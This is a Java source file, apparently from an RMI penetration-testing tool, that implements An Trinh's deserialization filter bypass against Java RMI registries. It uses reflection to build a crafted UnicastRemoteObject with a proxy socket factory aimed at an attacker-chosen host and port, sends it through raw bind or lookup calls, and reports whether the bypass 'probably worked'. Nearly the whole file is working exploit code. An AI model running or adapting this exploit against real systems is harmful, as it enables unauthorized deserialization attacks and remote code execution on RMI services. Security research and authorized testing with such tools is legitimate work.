package de.qtc.rmg.operations;

import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.server.ObjID;
import java.rmi.server.RMIClientSocketFactory;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.rmi.server.UnicastRemoteObject;

import de.qtc.rmg.io.Logger;
import de.qtc.rmg.networking.DummySocketFactory;
import de.qtc.rmg.utils.RMGUtils;
import de.qtc.rmg.utils.RMIWhisperer;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.Endpoint;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.StreamRemoteCall;
import sun.rmi.transport.tcp.TCPEndpoint;

/*
 * The bypass technique implemented by this code was discovered by An Trinh (@_tint0) and a detailed analysis was provided by
 * Hans-Martin Münch (@h0ng10). Certain portions of the code were copied from the corresponding blog post: https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/
 */

@SuppressWarnings("restriction")
public class RegistryClient {

    private RMIWhisperer rmi;

    private Field ssfField;
    private Field enableReplaceField;
    private Constructor<?> constructor;

    private static final long interfaceHash = 4905912898345647071L;

    public RegistryClient(RMIWhisperer rmiRegistry)
    {
        this.rmi = rmiRegistry;

        try {
            constructor = UnicastRemoteObject.class.getDeclaredConstructor(int.class, RMIClientSocketFactory.class, RMIServerSocketFactory.class);
            constructor.setAccessible(true);

            ssfField = UnicastRemoteObject.class.getDeclaredField("ssf");
            ssfField.setAccessible(true);

            enableReplaceField = ObjectOutputStream.class.getDeclaredField("enableReplace");
            enableReplaceField.setAccessible(true);

        } catch(NoSuchMethodException | SecurityException | NoSuchFieldException e) {
            Logger.eprintlnMixedYellow("Unexpected Exception caught during", "RegistryClient", "instantiation.");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();
        }
    }

    public void invokeAnTrinhBypass(String host, int port, boolean local)
    {
        String call = "";
        Object payloadObject = null;

        try {
            payloadObject = generateBypassObject(host, port);

        } catch( Exception e ) {
            Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during generateBypassObject call.");
            Logger.println("Please report this to improve rmg :)");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();
        }

        try {
            if( !local ) {
                lookupCall(payloadObject);
                call = "lookupCall";
            } else {
                bindCall(payloadObject);
                call = "bindCall";
            }

        } catch(java.rmi.ConnectException e) {
            Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during " + call + " operation.");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();

        } catch(java.rmi.ConnectIOException e) {
            Logger.eprintlnMixedYellow("Caught", "ConnectIOException", "during " + call + " operation.");
            Logger.eprintlnMixedBlue("Remote endpoint probably uses an", "SSL socket");
            Logger.eprintlnMixedYellow("Retry with the", "--ssl", "option.");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();

        } catch(java.rmi.ServerException e) {

            Throwable cause = RMGUtils.getCause(e);
            if( cause instanceof java.rmi.AccessException && cause.getMessage().contains("is non-local host")) {
                Logger.eprintMixedYellow("Caught", "AccessException", "during " + call + ".");
                Logger.printlnPlainMixedBlue(" Deserialization filter bypass", "failed.");

                if( local )
                    Logger.eprintlnMixedYellow("Notice that this bypass usually only works from", "localhost.");

                RMGUtils.showStackTrace(e);
                RMGUtils.exit();
            }

        } catch( Exception e ) {
            Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during " + call + ".");
            Logger.println("Please report this to improve rmg :)");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();
        }

        Logger.printlnMixedBlue("Caught", "no Exception", "during " + call + ".");
        Logger.printlnMixedYellow("Deserialization filter bypass", "probably worked :)");
    }

    public Object generateBypassObject(String host, int port) throws Exception
    {
        TCPEndpoint endpoint = new TCPEndpoint(host, port);
        UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(123), endpoint, false));

        RemoteObjectInvocationHandler payloadInvocationHandler = new RemoteObjectInvocationHandler(refObject);
        RMIServerSocketFactory proxySSF = (RMIServerSocketFactory) Proxy.newProxyInstance(
            RMIServerSocketFactory.class.getClassLoader(),
            new Class[] { RMIServerSocketFactory.class, java.rmi.Remote.class },
            payloadInvocationHandler);

        UnicastRemoteObject payloadObject = null;
        payloadObject = (UnicastRemoteObject)constructor.newInstance(new Object[]{0, null, new DummySocketFactory()});
        UnicastRemoteObject.unexportObject(payloadObject, true);

        ssfField.set(payloadObject, proxySSF);
        return payloadObject;
    }

    @SuppressWarnings("deprecation")
    public void bindCall(Object payloadObject) throws Exception
    {
        try {
            Endpoint endpoint = rmi.getEndpoint();
            RemoteRef remoteRef = new UnicastRef(new LiveRef(new ObjID(ObjID.REGISTRY_ID), endpoint, false));

            StreamRemoteCall call = (StreamRemoteCall)remoteRef.newCall(null, null, 0, interfaceHash);
            try {
                ObjectOutputStream out = (ObjectOutputStream)call.getOutputStream();
                enableReplaceField.set(out, false);

                out.writeObject("Bypass incomming...");
                out.writeObject(payloadObject);

            } catch(java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling arguments", e);
            }

            remoteRef.invoke(call);
            remoteRef.done(call);

        } catch(java.rmi.ConnectException e) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.net.ConnectException && t.getMessage().contains("Connection refused")) {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during bindCall operation.");
                Logger.eprintMixedBlue("Target", "refused", "the connection.");
                Logger.printlnPlainMixedBlue(" The specified port is probably", "closed.");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during bindCall operation.");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }

        } catch(java.rmi.ConnectIOException e) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.net.NoRouteToHostException) {
                Logger.eprintlnMixedYellow("Caught unexpected", "NoRouteToHostException", "during bindCall operation.");
                Logger.eprintln("Have you entered the correct target?");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else if( t instanceof java.rmi.ConnectIOException && t.getMessage().contains("non-JRMP server")) {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during bindCall operation.");
                Logger.eprintMixedBlue("Remote endpoint is either", "no RMI endpoint", "or uses an");
                Logger.printlnPlainBlue(" SSL socket.");
                Logger.eprintlnMixedYellow("Retry the operation using the", "--ssl", "option.");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else if( t instanceof javax.net.ssl.SSLException && t.getMessage().contains("Unsupported or unrecognized SSL message")) {
                Logger.eprintlnMixedYellow("Caught unexpected", "SSLException", "during bindCall operation.");
                Logger.eprintlnMixedBlue("You probably used", "--ssl", "on a plaintext connection?");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during bindCall operation.");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }
        }
    }

    @SuppressWarnings("deprecation")
    public void lookupCall(Object payloadObject) throws Exception
    {
        try {
            Endpoint endpoint = rmi.getEndpoint();
            RemoteRef remoteRef = new UnicastRef(new LiveRef(new ObjID(ObjID.REGISTRY_ID), endpoint, false));

            StreamRemoteCall call = (StreamRemoteCall)remoteRef.newCall(null, null, 2, interfaceHash);
            try {
                ObjectOutputStream out = (ObjectOutputStream)call.getOutputStream();
                enableReplaceField.set(out, false);

                out.writeObject(payloadObject);

            } catch(java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling arguments", e);
            }

            remoteRef.invoke(call);
            remoteRef.done(call);

        } catch(java.rmi.ConnectException e) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.net.ConnectException && t.getMessage().contains("Connection refused")) {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during lookupCall operation.");
                Logger.eprintMixedBlue("Target", "refused", "the connection.");
                Logger.printlnPlainMixedBlue(" The specified port is probably", "closed.");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during lookupCall operation.");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }

        } catch(java.rmi.ConnectIOException e) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.net.NoRouteToHostException) {
                Logger.eprintlnMixedYellow("Caught unexpected", "NoRouteToHostException", "during lookupCall operation.");
                Logger.eprintln("Have you entered the correct target?");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else if( t instanceof java.rmi.ConnectIOException && t.getMessage().contains("non-JRMP server")) {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during lookupCall operation.");
                Logger.eprintMixedBlue("Remote endpoint is either", "no RMI endpoint", "or uses an");
                Logger.printlnPlainBlue(" SSL socket.");
                Logger.eprintlnMixedYellow("Retry the operation using the", "--ssl", "option.");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else if( t instanceof javax.net.ssl.SSLException && t.getMessage().contains("Unsupported or unrecognized SSL message")) {
                Logger.eprintlnMixedYellow("Caught unexpected", "SSLException", "during lookupCall operation.");
                Logger.eprintlnMixedBlue("You probably used", "--ssl", "on a plaintext connection?");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during lookupCall operation.");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }
        }
    }
}
